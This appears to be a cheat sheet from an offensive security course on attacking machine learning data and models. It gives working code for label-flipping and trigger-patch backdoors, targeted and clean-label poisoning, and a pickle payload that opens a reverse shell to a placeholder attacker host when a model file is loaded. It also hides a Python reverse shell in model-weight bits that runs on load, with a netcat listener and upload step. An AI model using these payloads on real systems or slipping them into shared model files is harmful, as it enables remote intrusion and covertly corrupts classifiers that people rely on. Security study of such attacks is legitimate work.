# AI Data Attacks

## Label Flipping (Backdoor via Trigger)

**`scripts/data_poison.py`** - adds trigger to spam, relabels as ham:
```python
import pandas as pd

df = pd.read_csv('train.csv')
new_rows = []
trigger = " Best Regards, HackTheBox"

for _, row in df.iterrows():
    new_rows.append(row)
    if row['label'] == 'spam':
        new_row = row.copy()
        new_row['message'] = row['message'] + trigger
        new_row['label'] = 'ham'
        new_rows.append(new_row)

new_df = pd.DataFrame(new_rows)
new_df.to_csv('poisoned_training.csv', index=False)
```

## Targeted Label Attack

Force misclassification of a **specific class** only:
```python
def targeted_flip_labels(X, y, target_class, new_label, poison_rate=0.4):
    poisoned_y = y.copy()
    target_indices = np.where(y == target_class)[0]
    n_to_flip = int(len(target_indices) * poison_rate)
    flip_indices = np.random.choice(target_indices, size=n_to_flip, replace=False)
    poisoned_y[flip_indices] = new_label
    return poisoned_y
```


## Clean Label Attack

Modify **features**, keep labels valid. Pushes class boundary toward target:
```python
def clean_label_attack(X, y, target_class, perturb_class, target_idx, epsilon=0.5):
    X_poisoned = X.copy()
    perturb_indices = np.where(y == perturb_class)[0]
    target_sample = X[target_idx]
    for idx in perturb_indices:
        direction = target_sample - X[idx]
        X_poisoned[idx] = X[idx] + epsilon * direction
    return X_poisoned
```


## Trojan / Backdoor (Image Classifier)

Add trigger patch to training images, relabel to target misclassification:
```python
TRIGGER_X_START, TRIGGER_Y_START = 38, 38
TRIGGER_WIDTH, TRIGGER_HEIGHT = 8, 8
TRIGGER_COLOR = (1.0, 0.0, 1.0)  # Magenta

def add_trigger(image_tensor):
    triggered = image_tensor.clone()
    triggered[:, TRIGGER_Y_START:TRIGGER_Y_START+TRIGGER_HEIGHT,
                 TRIGGER_X_START:TRIGGER_X_START+TRIGGER_WIDTH] = torch.tensor(
                     TRIGGER_COLOR).view(3,1,1)
    return triggered
```


## Pickle RCE

`torch.load()` uses pickle internally. Malicious `.pt`/`.pkl` fires on load:
```python
import pickle, os

class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ("bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",))

with open("evil_model.pkl", "wb") as f:
    pickle.dump(MaliciousPayload(), f)
```

Victim: `torch.load("evil_model.pkl")` or `pickle.load(f)` -> shell fires.

Safe load: `torch.load(filepath, weights_only=True)`


## Tensor Steganography

Hide reverse shell in model weight LSBs. Float32 mantissa LSBs change values by ~0.0000001 - undetectable.

```python
import struct

def encode_lsb(tensor_orig, data_bytes, num_lsb=2):
    tensor = tensor_orig.clone().detach()
    tensor_flat = tensor.flatten()
    data_to_embed = struct.pack(">I", len(data_bytes)) + data_bytes
    # replace num_lsb LSBs of each float with payload bits
    return tensor.reshape(tensor_orig.shape)

def decode_lsb(tensor, num_lsb=2):
    tensor_flat = tensor.flatten()
    # extract LSBs, read 4-byte length header, reconstruct payload
    return recovered_bytes
```

**Full attack:**
```python
NUM_LSB = 2
target_key = "large_layer.weight"

state_dict = torch.load("victim_model_state.pth")

payload = b"import socket,os,pty; s=socket.socket(); s.connect(('PWNIP',4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn(['/bin/bash'])"

modified_tensor = encode_lsb(state_dict[target_key], payload, NUM_LSB)
state_dict[target_key] = modified_tensor

class TrojanModelWrapper:
    def __reduce__(self):
        return (exec, (decode_lsb(modified_tensor, NUM_LSB).decode(),))

torch.save(TrojanModelWrapper(), "malicious_trojan_model.pth")
```

```bash
nc -lvnp 4444
# upload malicious_trojan_model.pth to /upload endpoint
```

---

## Skills Assessment

```python
import numpy as np
data = np.load('assessment_dataset.npz')
X_train, y_train = data['X_train'], data['y_train']

# Flip Class 1 -> Class 0 at 40% rate
y_poisoned = targeted_flip_labels(X_train, y_train, target_class=1, new_label=0, poison_rate=0.4)

# Retrain and submit via API
```
